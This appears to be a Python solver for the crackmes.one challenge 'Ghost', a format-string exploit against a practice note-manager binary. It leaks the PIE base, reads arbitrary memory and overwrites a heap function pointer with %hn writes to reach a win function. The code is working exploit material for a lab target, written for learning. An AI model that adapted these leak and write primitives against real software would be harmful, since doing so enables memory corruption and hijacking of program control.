#!/usr/bin/env python3
"""
0xf00's Ghost (crackmes.one 682f69bd6297cca3ff7d7b9b) -- solver.

Not a "serial": this is a small note manager ("1. Add / 2. Update / 3. Erase
/ 4. Trigger / 5. Leak / 6. Chaos / 7. Quit") with a format string in
"5. Leak" (`printf(buf)` straight on a user-supplied buffer).

Exploit (see the README for the full write-up):
  1. leak the return address of "call sub_1790" (case 5) in main()
     via "%17$p" -> compute the PIE base (page-aligned).
  2. arbitrary read (%N$s argument that dereferences a controlled pointer)
     of note slot qword_41A0[0], then of its "meta" field (struct+8): that
     yields the heap address of the function pointer used by "4. Trigger".
  3. arbitrary write (classic write-what-where, 2x %hn, 16 bits each):
     rewrite only the LOW 32 bits of that function pointer -- the high
     32 bits are already correct, because the old and the new value are
     both addresses in the SAME PIE binary (same base).
  4. "4. Trigger" on slot 0 then calls sub_1960 directly (a noreturn
     function that prints the message and exit(0)) instead of the normal
     display function.

Usage:
    ./ghost-solve-en.py                  # exploit the binary and print the message
    ./ghost-solve-en.py --check          # same as above, exit code 0/1
    ./ghost-solve-en.py --binary PATH    # target another copy of the binary
"""
import argparse
import itertools
import os
import re
import select
import struct
import subprocess
import sys
import time

DEFAULT_BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "original", "ghost")

RET_SUB1790_OFFSET = 0x126A  # return of "call sub_1790" in main() (case 5 "Leak")
SLOTS_OFFSET = 0x41A0        # qword_41A0[9] (.bss): note pointers
SUB_1960_OFFSET = 0x1960     # "win" function (prints the message, exit(0))
WIN_TEXT = b"Congratulations"


class Ghost:
    """Binary-safe I/O on raw pipes (no pty -> no echo or line editing
    that would mangle the control bytes in our payloads)."""

    def __init__(self, binary):
        self.p = subprocess.Popen(
            [binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, bufsize=0,
        )
        self.buf = b""

    def _read_until(self, marker=b"$ ", timeout=3.0):
        end = time.time() + timeout
        while marker not in self.buf:
            r, _, _ = select.select([self.p.stdout], [], [], max(0, end - time.time()))
            if not r:
                return self.buf
            chunk = os.read(self.p.stdout.fileno(), 65536)
            if not chunk:
                return self.buf
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def send(self, data: bytes):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def menu(self):
        return self._read_until(b"$ ")

    def add(self, data: bytes):
        self.send(b"1\n")
        self._read_until(b"Note: ")
        self.send(data + (b"" if data.endswith(b"\n") else b"\n"))
        return self.menu()

    def trigger(self, idx):
        self.send(b"4\n")
        self._read_until(b"ID: ")
        self.send(f"{idx}\n".encode())
        return self.menu()

    def leak(self, data: bytes, timeout=3.0):
        self.send(b"5\n")
        self._read_until(b"Leak: ")
        self.send(data + (b"" if data.endswith(b"\n") else b"\n"))
        return self._read_until(b"$ ", timeout=timeout)

    def close(self):
        try:
            self.p.kill()
        except Exception:
            pass


def read_ptr(g, addr):
    """Arbitrary 8-byte read at `addr` via "%7$s" (the pointer sits
    AFTER the format text, never before: its top 2 bytes are always
    0x00, which would truncate the "string" if it were placed first)."""
    payload = b"%7$s" + b"AAAA" + struct.pack("<Q", addr)
    out = g.leak(payload)
    idx = out.find(b"AAAA")
    raw = out[:idx]
    return int.from_bytes(raw.ljust(8, b"\x00")[:8], "little")


def _build_text(words, order, start_pos):
    text, count = b"", 0
    for idx in order:
        want = words[idx]
        pad = (want - count) % 65536
        text += f"%{start_pos+idx}$hn".encode() if pad == 0 else f"%{pad}c%{start_pos+idx}$hn".encode()
        count = (count + pad) % 65536
    return text


def fmt_write_low32(addr_lo, addr_hi, value32):
    """Write the low 32 bits of `value32` to [addr_lo, addr_hi=addr_lo+2]
    with 2x %hn (the classic write-what-where driven by the printed-character
    counter). The two pointers sit AFTER the text, 8-byte aligned; their
    argument index therefore depends on the padded length of that text.
    That fixed point is solved in a few iterations (single-digit positions,
    converges immediately)."""
    words = [value32 & 0xFFFF, (value32 >> 16) & 0xFFFF]
    start_pos = 6
    for _ in range(4):
        best = min(
            (( _build_text(words, order, start_pos), order) for order in itertools.permutations(range(2))),
            key=lambda t: len(t[0]),
        )
        text, order = best
        pad_len = (-len(text)) % 8
        text_padded = text + b"Z" * pad_len
        needed_pos = 6 + len(text_padded) // 8
        if needed_pos == start_pos:
            addr_bytes = struct.pack("<Q", addr_lo) + struct.pack("<Q", addr_hi)
            return text_padded + addr_bytes
        start_pos = needed_pos
    raise RuntimeError("fixed point not reached")


def exploit(binary, quiet=False):
    def log(*a):
        if not quiet:
            print(*a)

    g = Ghost(binary)
    g.menu()
    g.add(b"petik")  # occupy slot 0

    out = g.leak(b"%17$p")
    m = re.search(rb"0x[0-9a-f]+", out)
    if not m:
        g.close()
        raise RuntimeError(f"PIE base leak failed: {out!r}")
    base = int(m.group(0), 16) - RET_SUB1790_OFFSET
    if base % 0x1000 != 0:
        g.close()
        raise RuntimeError(f"base not page-aligned ({hex(base)}), bad leak")
    log(f"[+] PIE base       = {hex(base)}")

    struct_ptr = read_ptr(g, base + SLOTS_OFFSET)
    meta_ptr = read_ptr(g, struct_ptr + 8) if struct_ptr else 0
    log(f"[+] note[0] struct = {hex(struct_ptr)}")
    log(f"[+] note[0] meta   = {hex(meta_ptr)}")
    # valid heap is expected to share the high 32 bits of the PIE base (same image)
    if struct_ptr < 0x1000 or meta_ptr < 0x1000 or (meta_ptr >> 32) != (base >> 32):
        g.close()
        raise RuntimeError(f"inconsistent heap read (struct={hex(struct_ptr)} meta={hex(meta_ptr)})")

    target = base + SUB_1960_OFFSET
    payload = fmt_write_low32(meta_ptr, meta_ptr + 2, target & 0xFFFFFFFF)
    log(f"[+] *meta <- {hex(target)} (payload {len(payload)} bytes)")
    g.leak(payload)

    out = g.trigger(0)
    g.close()
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--binary", default=DEFAULT_BIN, help="path to the ghost binary")
    ap.add_argument("-q", "--quiet", action="store_true", help="print only the result")
    ap.add_argument("--check", action="store_true", help="exit code 0/1, no text output")
    args = ap.parse_args()

    out = b""
    last_err = None
    for attempt in range(5):  # the heap read succeeds on ~90% of runs ("Erase" rand() is not involved;
        try:                  # the miss is a rare marker auto-detect glitch). Restart the process if needed.
            out = exploit(args.binary, quiet=args.quiet or args.check)
            if WIN_TEXT in out:
                break
        except RuntimeError as e:
            last_err = e
    else:
        if last_err and not (args.quiet or args.check):
            print(f"[-] {last_err}", file=sys.stderr)
    ok = WIN_TEXT in out
    if not args.check:
        print(out.decode(errors="replace").strip())
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
